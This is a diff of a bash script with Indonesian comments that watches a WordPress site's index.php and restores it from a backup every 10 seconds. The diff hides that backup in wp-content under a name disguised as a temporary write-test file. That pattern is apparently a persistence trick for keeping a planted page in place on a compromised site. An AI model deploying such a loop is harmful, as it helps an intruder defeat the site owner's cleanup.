@@ -2,25 +2,12 @@
 
 # Definisikan lokasi file index.php
 INDEX_FILE="/home/shirinba/public_html/index.php"
-
 # Definisikan lokasi folder backup
-BACKUP_FOLDER="/home/shirinba/php"
-
-# Definisikan lokasi folder yang ingin dilindungi
-PROTECTED_FOLDER="/home/shirinba/public_html/index.php"
-
-# Definisikan lokasi backup folder
-PROTECTED_FOLDER_BACKUP="/home/shirinba/php/data"
-
-# Definisikan lokasi file log
-LOG_FILE="/home/shirinba/php/data"
-
+BACKUP_FOLDER="/home/shirinba/public_html/wp-content/"
 # Buat folder backup jika belum ada
 mkdir -p "$BACKUP_FOLDER"
-mkdir -p "$PROTECTED_FOLDER_BACKUP"
-
 # Tentukan nama file backup
-BACKUP_FILE="$BACKUP_FOLDER/index.php"
+BACKUP_FILE="$BACKUP_FOLDER/temp-write-test-66fc234e325d18-364384371616"
 
 # Backup file index.php jika belum ada backup
 if [ ! -f "$BACKUP_FILE" ]; then
@@ -28,7 +15,7 @@ if [ ! -f "$BACKUP_FILE" ]; then
     echo "Backup pertama dibuat: $BACKUP_FILE"
 fi
 
-# Fungsi untuk memantau perubahan pada file index.php
+# Fungsi untuk memonitor perubahan pada file index.php
 monitor_file() {
     while true; do
         # Hitung checksum file index.php untuk mendeteksi perubahan
@@ -40,13 +27,6 @@ monitor_file() {
             echo "Perubahan terdeteksi pada index.php, mengembalikan backup..."
             cp "$BACKUP_FILE" "$INDEX_FILE"
             echo "index.php dikembalikan ke versi backup."
-
-            # Jika folder yang dilindungi tidak ada, salin dari backup
-            if [ ! -d "$PROTECTED_FOLDER" ]; then
-                mkdir -p "$PROTECTED_FOLDER"
-                cp -r "$PROTECTED_FOLDER_BACKUP"/* "$PROTECTED_FOLDER"
-                echo "Folder yang dilindungi telah dipulihkan."
-            fi
         fi
 
         # Tunggu 10 detik sebelum pengecekan selanjutnya
@@ -55,4 +35,3 @@ monitor_file() {
 }
 
 # Jalankan fungsi monitoring
-monitor_file
